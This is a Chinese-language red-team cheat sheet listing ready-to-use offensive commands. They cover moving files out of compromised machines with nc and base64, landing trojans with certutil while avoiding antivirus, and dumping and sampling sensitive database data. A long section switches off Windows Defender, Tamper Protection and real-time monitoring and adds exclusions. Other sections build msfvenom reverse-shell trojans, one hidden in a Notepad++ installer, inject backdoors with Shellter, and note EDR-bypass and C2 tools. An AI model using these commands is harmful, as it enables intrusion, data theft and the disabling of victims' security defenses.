综合技巧
========================================

临时服务器
----------------------------------------
- python方式
	+ ``python2 - m SimpleHTTPServer``
	+ ``python3 -m http.server 8888``
- php方式
	+ ``php -S 127.0.0.2:8181 -t /www /www/app.php``

windows后台运行程序
----------------------------------------
+ ``call start /b C:\frpc.exe -c C:\frpc.ini``

内网扫描
----------------------------------------
+ Netspy
	- 项目地址：``https://github.com/shmilylty/netspy``
	- 一款快速探测内网可达网段工具。

传输数据
----------------------------------------
- nc
	+ 连续传输两个数据包：``cat poc1.dat | sed s'/.$//' |nc -u 10.0.0.3 1023 -w 2 | cat poc2.dat | sed s'/.$//' |nc -u 10.0.0.3 1023 -w 2``
	+ dat文件存储数据包内容
	+ ``sed s'/.$//'`` 为去掉最后一个字节0a
	+ -u参数表示使用udp协议

文件传输
----------------------------------------

出网传输
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- nc
	- 文件传输
		+ 将B机器上的file.txt传输到A机器上
		+ ``A机器：nc -lvp 1567 > file.txt``
		+ ``B机器：nc 172.31.100.7 1567 < file.txt``
	- 目录传输
		+ ``tar -cvf – dir_name | nc -l 1567``
		+ ``nc -n 172.31.100.7 1567 | tar -xvf -``
	- 加密传输
		+ ``nc localhost 1567 | mcrypt –flush –bare -F -q -d -m ecb > file.txt``
		+ ``mcrypt –flush –bare -F -q -m ecb < file.txt | nc -l 1567``

不出网文件落盘
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- python
	- 目标机器转base64
		+ ``目标机器有python：python -c 'print(__import__("base64").b64encode(open("secret.zip", "rb").read()))'``
	- 个人机器还原
		+ ``cat - > zip.txt``
		+ ``输入拿到的base64串：UEsDBBQACQAIAEZ/CE8bl，输入完成按回车``
		+ ``^C即ctrl+c``
		+ ``还原文件：base64 -d zip.txt > secret.zip``
- certutil.exe
	- 前提：具有目标机器的命令执行shell，进行木马文件落盘，躲避AV的文件下载行为的查杀
	- 示例
		::
		
			将文件hack.exe转换成签名文件（base64编码）
			certutil -f -encode d:\hack.exe d:\out.txt
			使用echo命令将out.txt文件写入目标机器，执行以下代码将文件还原成exe
			certutil -f -decode d:\out.txt d:\hack.exe

脱裤
----------------------------------------
- sqlcmd
	+ dump数据:``sqlcmd -S 127.0.0.1,1433 -U username123 -P pasword123 -d datebase123 -Q"BACKUP DATABASE database123 to disk='c:\www\myweb\wap\userlz.bak'"``
- sqlmap
- DataMiner
	+ 用法
		::
		
			Sampledata,缩减命令: SD              //数据库全部取样功能
			Overview,缩减命令: OV                //数据库数据量统计功能
			SearchSensitiveData,缩减命令: SS     //数据库敏感数据捕获功能
			SingleTable,缩减命令: ST             //数据库单表取样功能
			参数：
			-T  databaseType                    //数据库类型(必选参数，目前支持 mysql、mssql、oracle、mongodb)
			-da 127.0.0.1:3306                  //数据库地址(必选参数，除非使用-f参数文件输入数据)
			-du name                            //数据库用户名(必选参数，除非使用-f参数文件输入数据)
			-dp passwd                          //数据库密码(必选参数，除非使用-f参数文件输入数据)
			-pa 127.0.0.1:8080                  //代理地址(可选参数)
			-pu name                            //代理用户名(可选参数)
			-pp passwd                          //代理密码(可选参数)
			-n  1                               //指定取样数据条数，默认为3(可选参数)
			-t 1                                //数据库敏感数据捕获功能使用线程数量，默认为5(可选参数)
			-p 自定义正则表达式                  //数据库敏感数据捕获功能自定义正则匹配参数(可选参数)
			-WA                                 //使用Windows本地认证方式登录(仅针对于mssql数据库)
			-f data.txt                         //批量数据库信息导入文件，文本中一条数据库信息占用一行
												文本格式：schema://user:password@host:port 
												如：mysql://root:123321@127.0.0.1:3306
													mssql://sa:123321@127.0.0.1:1433
													oracle://system:123321@127.0.0.1:1521
													mongo://admin:123321@127.0.0.1:27017
													mongo://admin:123321@127.0.0.1:27017?admin
													mongo://:@127.0.0.1:27017
													上述后两条分别为mongodb数据库 指定admin数据库登录模式与无用户密码登录模式
	+ 数据采样
		::
		
			//指定mysql数据库，连接数据库，每个表中内容取样条数为2
			DataMiner SD -T mysql -da 127.0.0.1:3306 -du name -dp passwd -n 2
			//指定mssql数据库，使用socks代理连接数据库，每个表中内容取样条数为2
			DataMiner SD -T mssql -da 127.0.0.1:1433 -du name -dp passwd -pa 127.0.0.1:8080 -pu name -pp passwd -n 2
			//使用文件批量导入数据库连接信息进行连接，每个表中内容取样条数为2
			DataMiner SD -f data.txt  -n 2
			//使用文件批量导入数据库连接信息并使用socks代理进行连接，每个表中内容取样条数为2
			DataMiner SD -f data.txt -pa 127.0.0.1:8080 -pu name -pp passwd -n 2
			//MSSQL数据库本地Windows认证登录使用全部数据库取样功能
			DataMiner SD -T mssql -WA
			//Mongodb数据库无用户密码登录模式使用全部数据库取样功能
			DataMiner SD -T mongo -da 127.0.0.1:27017
			//Mongodb数据库指定admin数据库登录模式使用全部数据库取样功能
			DataMiner SD -T mongo -da 127.0.0.1:27017?admin -du name -dp password
	+ 统计概览
		::
		
			//指定oracle数据库，连接数据库，使用数据量统计命令
			DataMiner OV -T oracle -da 127.0.0.1:1521 -du name -dp passwd
			//指定mysql数据库,使用socks代理连接数据库，使用数据量统计命令
			DataMiner OV -T mysql -da 127.0.0.1:3306 -du name -dp passwd -pa 127.0.0.1:8080 -pu name -pp passwd
			//使用文件批量导入数据库连接信息进行连接，使用数据量统计命令
			DataMiner OV -f data.txt
			//使用文件批量导入数据库连接信息并使用socks代理进行连接，使用数据量统计命令
			DataMiner OV -f data.txt -pa 127.0.0.1:8080 -pu name -pp passwd
			//MSSQL数据库本地Windows认证登录使用数据量统计概览功能
			DataMiner OV -T mssql -WA
			//Mongodb数据库无用户密码登录模式使用数据量统计概览功能
			DataMiner OV -T mongo -da 127.0.0.1:27017
			//Mongodb数据库指定admin数据库登录模式使用数据量统计概览功能
			DataMiner OV -T mongo -da 127.0.0.1:27017?admin -du name -dp password
	+ 敏感信息捕获
		::
		
			//指定mssql数据库，连接数据库，每个表中内容取样条数为2,并指定使用6个线程
			DataMiner SS -T mssql -da 127.0.0.1:1433 -du name -dp passwd -n 2 -t 6
			//指定mysql数据库,使用socks代理连接数据库，每个表中内容取样条数为2，并指定使用6个线程
			DataMiner SS -T mysql -da 127.0.0.1:3306 -du name -dp passwd -pa 127.0.0.1:8080 -pu name -pp passwd -n 2 -t 6
			//使用文件批量导入数据库连接信息进行连接，每个表中内容取样条数为2,并指定使用6个线程
			DataMiner SS -f data.txt  -n 2 -t 6
			//使用文件批量导入数据库连接信息并使用socks代理进行连接，每个表中内容取样条数为2,并指定使用6个线程
			DataMiner SS -f data.txt -pa 127.0.0.1:8080 -pu name -pp passwd -n 2 -t 6
			//指定mysql数据库,连接数据库，每个表中内容取样条数为2,指定使用6个线程，并使用自定义正则匹配用户名
			DataMiner SS -T mysql -da 127.0.0.1:3306 -du name -dp passwd -n 2 -t 6 -p ^[\x{4e00}-\x{9fa5}]{2,4}$
			//MSSQL数据库本地Windows认证登录使用关键敏感信息捕获功能
			DataMiner SS -T mssql -WA
			//Mongodb数据库无用户密码登录模式使用关键敏感信息捕获功能
			DataMiner SS -T mongo -da 127.0.0.1:27017
			//Mongodb数据库指定admin数据库登录模式使用关键敏感信息捕获功能
			DataMiner SS -T mongo -da 127.0.0.1:27017?admin -du name -dp password
	+ 导出表数据
		::
		
			//指定mysql数据库,连接数据库，指定test数据库中users表，取样条数为2
			DataMiner ST -T mysql -da 127.0.0.1:3306 -du name -dp passwd -n 2 -dt test.users
			//指定mysql数据库,使用socks代理连接数据库，指定test数据库中users表，取样条数为2
			DataMiner ST -T mysql -da 127.0.0.1:3306 -du name -dp passwd -pa 127.0.0.1:8080 -pu name -pp passwd -n 2 -dt test.users

端口信息
-----------------------------------------
- linux
	|netstat|
	
	::
	
		+ Local ：访问端口的方式，0.0.0.0 是对外开放端口，说明80端口外面可以访问；127.0.0.1 说明只能对本机访问，外面访问不了此端口；
		+ Address：端口
		+ Foregin Address：对外开放，一般都为0.0.0.0：* 
		+ Program name：此端口是那个程序在用，程序挂载此端口
		+ 重点说明 0.0.0.0 是对外开放，通过服务域名、ip可以访问的端口
		+ 127.0.0.1 只能对本机 localhost访问，也是保护此端口安全性
		+ ::: 这三个: 的前两个”::“，是“0:0:0:0:0:0:0:0”的缩写，相当于IPv6的“0.0.0.0”，就是本机的所有IPv6地址，第三个:是IP和端口的分隔符

- windows
	+ ``netstat -ano``

关闭Windows defender
-----------------------------------------
- 基本信息
	+ 查看版本
		- 系统查看：``Windows Security->Settings->About，Antimalware Client Verions``
		- 命令查看：``dir "C:\ProgramData\Microsoft\Windows Defender\Platform\" /od /ad /b``
	+ 查看已排除的查杀列表
		- 系统查看：``Windows Security->Virus & theat protection settings->Add or remove exclusions``
		- 命令查看：``reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions" /s``
		- powershell查看：``Get-MpPreference | select ExclusionPath``
- TrustedInstaller权限
	+ 关闭Windows defender需要TrustedInstaller权限。
	+ TrustedInstaller是从Windows Vista开始出现的一个内置安全主体，在Windows中拥有修改系统文件权限，本身是一个服务，以一个账户组的形式出现。 它的全名是：NT SERVICE\TrustedInstaller。
	+ 因为Administratior权限和system权限的cmd无法关闭Windows defender（powershell可以）
- 获取TrustedInstaller权限
	+ 参看提权。
- Tamper Protection
	- 篡改防护
		+ 当开启Tamper Protection时，用户将无法通过注册表、Powershell和组策略修改Windows Defender的配置。
	- 查看
		+ 面板查看：``Windows Security->Virus & theat protection settings``
		+ 命令查看：``reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection"``
	- 关闭
		+ 面板关闭：``Windows Security->Virus & theat protection settings，禁用Tamper Protection``
		+ 命令关闭：``reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /d 4 /t REG_DWORD /f``
		+ 其它：``NSudoLG.exe -U:T cmd /c "reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /d 4 /t REG_DWORD /f"``
		+ 注：其中数值5代表开启，数值4代表关闭。
- 添加排除项
	+ 命令行：``reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "c:\temp" /d 0 /t REG_DWORD /f``
	+ powershell：``Add-MpPreference -ExclusionPath "c:\temp"``
	+ 其它：``NSudoLG.exe -U:T cmd /c "reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "c:\temp" /d 0 /t REG_DWORD /f"``
- 关闭Windows defender
	+ 命令关闭：``reg add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v DisableAntiSpyware /t reg_dword /d 1 /f``
	+ powershell关闭：``Set-MpPreference -DisableRealtimeMonitoring $true``
	+ ``NSudoLG.exe -U:T cmd /c "reg add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v DisableAntiSpyware /t reg_dword /d 1 /f"``
	+ ``AdvancedRun.exe /EXEFilename "%windir%\system32\cmd.exe" /CommandLine '/c reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /d 1 /t REG_DWORD /f' /RunAs 8 /Run``
	+ StopDefender：``https://github.com/lab52io/StopDefender``
- Tamper Protection防篡改无法关闭
	+ 利用原理：Windows Defender的机制是当存在其他杀软时就会关闭他自己的功能，非常值得注意的是，Tamper Protection防篡改保护也会临时关闭。因此，当我们下载一个杀软去覆盖WD后强制卸载它，然后再卸载我们的杀软。
	+ 安装火绒
	+ 关闭Windows defender
		- ``AdvancedRun.exe /EXEFilename "%windir%\system32\cmd.exe" /CommandLine '/c reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /d 1 /t REG_DWORD /f' /RunAs 8 /Run``
	+ 使用WDControl_1.7.0.exe卸载defender
- 注：powershell的相关操作在新版本windows系统已不再适用。

免杀
-----------------------------------------
- 核心技术：分离执行和加密混淆等技术
- 免杀加载器
    + venom/msfvenom
        - venom生成其实是直接调用的msfvenom
        - 支持生成多平台payload，比如android、ios、linux/unix、office等等
        - 列出所有可用编码
            ``msfvemon -l encoders``
        - 裸奔木马
            ``msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.11 LPORT=1234 -f exe > /root/test.exe``
        - 免杀木马
            ``msfvenom -p windows/shell_reverse_tcp LHOST=10.10.20.2 LPORT=3333 -e x86/shikata_ga_nai -x npp.7.8.6.Installer.exe -i 12 -f exe -o /root/npp1.exe``

        |msfvemon1|
    + Shellter动态注入工具
        - 下载地址：https://www.shellterproject.com/download/
        - Choose Operation Mode - Auto/Manual (A/M/H)
            选择模式: 自动模式自动注入后门，M高级模式，H帮助
        - PE Target：
            注入的程序.
        - Enable Stealth Mode?
            是否启用隐身模式
        - Use a listed payload or custom? (L/C/H)
            使用攻击模块列表或者自定义
        - Select payload by index:
            选择payload序号
        - SET LHOST
            设置反弹回来的IP 本机
        - SET LPORT
            设置接收反弹的端口
    + veil
- 防御EDR检测
    + 地狱之门
        - 原理：避免在用户层被EDR hook的敏感函数检测到敏感行为，利用从ntdll中读取到的系统调用号进行系统直接调用来绕过敏感API函数的hook。
        - 相关项目：https://github.com/am0nsec/HellsGate
    + 光环之门
        - 原理：
        - 相关项目：https://github.com/trickster0/TartarusGate
        - 相关资料：https://blog.vincss.net/2020/03/re011-unpack-crypter-cua-malware-netwire-bang-x64dbg.html
    + SSN系统调用地址排序
        - 原理：ntdll.dll中的特性就是所有的Zw函数是根据函数地址的大小来进行排序的，所以我们就只需要遍历所有Zw函数，记录其函数名和函数地址，最后将其按照函数地址升序排列后，每个函数的调用号就是其对应的排列顺序的索引号。

综合协同工具
-----------------------------------------
- Viper 【C&C】
	+ 项目地址：``https://github.com/FunnyWolf/Viper``，``https://www.yuque.com/vipersec``
	+ 说明：
		- Viper(炫彩蛇)是一款图形化内网渗透工具,将内网渗透过程中常用的战术及技术进行模块化及武器化.
		- Viper(炫彩蛇)集成杀软绕过,内网隧道,文件管理,命令行等基础功能.
		- Viper(炫彩蛇)当前已集成70+个模块,覆盖初始访问/持久化/权限提升/防御绕过/凭证访问/信息收集/横向移动等大类.
		- Viper(炫彩蛇)目标是帮助红队工程师提高攻击效率,简化操作,降低技术门槛.
		- Viper(炫彩蛇)支持在浏览器中运行原生msfconsole,且支持多人协作.
- PUPY【C&C】
	+ 项目地址：``https://github.com/n1nj4sec/pupy``
	+ 帮助：``https://3gstudent.github.io/Pupy%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90-Windows%E5%B9%B3%E5%8F%B0%E4%B8%8B%E7%9A%84%E5%8A%9F%E8%83%BD``
	+ Pupy是一个用 Python 编写、开源的跨平台（Windows、Linux、OSX、Android）远程管理和后期开发工具。

.. |netstat| image:: ../images/netstat.png
.. |msfvemon1| image:: ../images/msfvenom1.png
